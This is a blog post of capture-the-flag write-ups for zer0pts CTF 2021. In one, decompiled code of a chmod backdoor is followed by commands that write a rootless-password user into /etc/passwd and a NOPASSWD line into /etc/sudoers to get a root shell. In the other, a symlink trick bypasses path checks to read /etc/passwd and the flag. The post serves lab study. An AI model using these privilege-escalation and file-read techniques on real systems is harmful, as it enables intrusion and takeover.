---
layout: post
title:  "zer0pts CTF 2021 writeups"
date:   2021-03-22 19:59:36 +0200
categories: ctf
---

These are the writeups for the [zer0pts CTF 2021](https://2021.ctf.zer0pts.com/) challenges that I personally solved. Pretty hard challenges, but again learned a lot!

## infected

There are two parts to this challenge. First to get through the initial part and to get a shell we need to figure out what input produces the correct hash when we have part of the source and the hash. Let's write a Python program to get past it:
```python=
from pwn import *
import itertools
import hashlib
import string


r = remote ('others.ctf.zer0pts.com',11011)

chall = r.recvline().decode('utf-8')

hashval = chall.split("=")[1].strip()
suffix = chall.split("=")[0][12:32]


table = string.ascii_letters + string.digits + "._"

for v in itertools.product(table, repeat=4):
    if hashlib.sha256((''.join(v) + suffix).encode()).hexdigest() == hashval:
        prefix = ''.join(v)
        print("[+] Prefix = " + prefix)
        r.sendline(prefix)
        r.interactive()
        break
else:
    print("[-] Solution not found :thinking_face:")

```
Now we have a shell and neet to read the flag at `/root`.  Reverse the provided binary with Ghidra to reveal how the backdoor works:
```c=
void backdoor_write(undefined8 param_1,char *param_2,size_t param_3)

{
  int iVar1;
  __mode_t __mode;
  char *__s;
  char *__s1;
  char *__file;
  char *__nptr;
  long in_FS_OFFSET;
  stat64 local_a8;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  __s = strndup(param_2,param_3);
  if (__s == (char *)0x0) {
    fuse_reply_err(param_1,0x16);
    goto LAB_00100c8c;
  }
  __s1 = strtok(__s,":");
  __file = strtok((char *)0x0,":");
  __nptr = strtok((char *)0x0,":");
  if (((__s1 == (char *)0x0) || (__file == (char *)0x0)) || (__nptr == (char *)0x0)) {
    fuse_reply_err(param_1,0x16);
  }
  else {
    iVar1 = strncmp(__s1,"b4ckd00r",8);
    if (iVar1 == 0) {
      stat64(__file,&local_a8);
      if ((local_a8.st_mode & 0xf000) == 0x8000) {
        __mode = atoi(__nptr);
        iVar1 = chmod(__file,__mode);
        if (iVar1 == 0) {
          fuse_reply_write(param_1,param_3,param_3);
          goto LAB_00100c7d;
        }
      }
      fuse_reply_err(param_1,0x16);
    }
    else {
      fuse_reply_err(param_1,0x16);
    }
  }
LAB_00100c7d:
  free(__s);
LAB_00100c8c:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
It reads from stdin and calls `chmod(2)` so it can be used to modify file permissions. The device is `/dev/backdoor` and the syntax of the command is `b4ckd00r:filename:permissions`.

Modify some file permissions:
```
echo "b4ckd00r:/etc/sudoers:222" > /dev/backdoor
echo "b4ckd00r:/etc/passwd:222" > /dev/backdoor
echo "pwn:x:1000:0:pwn:/root:/bin/sh" >> /etc/passwd
echo "pwn  ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "b4ckd00r:/etc/sudoers:444" > /dev/backdoor
```

and then `sudo su`to get a root shell and the flag.

## GuestFS::AFR
The source code is provided:
```php=
  function create($name, $type=0, $target="")
    {
        $this->validate_filename($name);

        if ($type === 0) {

            /* Create an empty file */
            $fp = @fopen($this->root.$name, "w");
            @fwrite($fp, '');
            @fclose($fp);

        } else {

            /* Target file must exist */
            $this->assert_file_exists($this->root.$target);

            /* Create a symbolic link */
            @symlink($target, $this->root.$name);

            /* This check ensures $target points to inside user-space */
            try {
                $this->validate_filepath(@readlink($this->root.$name));
            } catch(Exception $e) {
                /* Revert changes */
                @unlink($this->root.$name);
                throw $e;
            }

        }
    }

    * Security Functions */
    function validate_filepath($path)
    {
        if (strpos($path, "/") === 0) {
            throw new Exception('invalid filepath (absolute path)');
        } else if (strpos($path, "..") !== false) {
            throw new Exception('invalid filepath (outside user-space)');
        }
    }

    function validate_filename($name)
    {
        if (preg_match('/[^a-z0-9]/i', $name)) {
            throw new Exception('invalid filename');
        }
    }

    function assert_file_exists($name)
    {
        if (file_exists($name) === false
            && is_link($name) === false) {
            throw new Exception('file not found');
        }
    }

```
It reveals how to bypass the security checks using the following steps:

1. create regular file foo
2. create symlink bar to foo
3. delete regular file foo (it just unlinks)
4. create new symlink bar to LFI `/../../../../../etc/passwd`
5. read contens of foo

the flag location is `/../../../../../flag`

